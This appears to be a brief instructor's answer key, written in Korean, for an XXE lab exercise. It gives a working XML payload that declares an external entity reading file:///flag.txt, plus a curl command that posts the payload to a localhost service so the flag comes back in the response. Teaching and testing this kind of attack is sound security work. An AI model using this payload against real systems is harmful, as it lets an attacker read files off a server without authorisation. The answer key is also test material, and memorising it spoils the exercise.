# [강사용] XXE 풀이
```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///flag.txt">]>
<order><name>&xxe;</name></order>
```
`curl -XPOST --data-binary @x.xml http://localhost:9208/order` → 응답에 flag.
